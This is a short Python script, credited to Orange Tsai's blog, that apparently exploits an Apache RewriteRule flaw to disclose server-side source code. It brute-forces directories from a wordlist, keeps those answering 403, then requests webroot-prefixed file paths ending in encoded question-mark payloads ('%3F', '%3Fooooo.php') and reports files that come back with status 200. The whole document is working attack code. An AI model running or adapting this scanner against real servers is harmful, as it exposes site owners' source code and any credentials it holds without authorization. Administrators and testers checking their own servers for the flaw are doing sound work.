#!/usr/bin/python3
# Credit: https://blog.orange.tw/ | https://x.com/orange_8361
from termcolor import colored, cprint
import requests

webroot            = '/var/www/html' # '/var/www/html' map the webroot without the trailing backslash
directory_wordlist = 'raft-medium-directories.txt'
file_wordlist      = 'raft-medium-files.txt'
url_ip_domain      = '127.0.0.1' #map the ip/url/domain without the trailing backslash or schema.
schema             = 'http' # http or https
payloads           = ["%3F", "%3Fooooo.php", ]
_directories       = []


def directories():
    with open(directory_wordlist, 'r', errors='replace') as f:
        lines = [word.replace('\n','') for word in f.readlines()]
        for line in lines:
            r = requests.get(f"{schema}://{url_ip_domain}/{line}/", allow_redirects=False)
            if r.status_code == 403:
                print(colored(f"Found directory - {line}", "green"))
                _directories.append(line)

def source_code_files():
    with open(file_wordlist, 'r', errors='replace') as f:
        lines = [word.replace('\n','') for word in f.readlines()]
        for line in lines:
            for directory in _directories:
                for payload in payloads:
                    # Example: http://localhost/var/www/html/index.html%3F - Depends on the RewriteRule in apache config.
                    r = requests.get(f"{schema}://{url_ip_domain}/{directory}{webroot}/{directory}/{line}{payload}", allow_redirects=False) # remember to change webroot depending on target.
                    if r.status_code == 200:
                        print(colored(f"Reponse code: {r.status_code} | Found File - Payload: {r.url}", "green"))

if __name__ == "__main__":
    print(colored("\nLooking for 403 directories.", "yellow"))
    directories()

    print(colored("\nLooking for interesting source code disclosures.", "yellow"))
    source_code_files()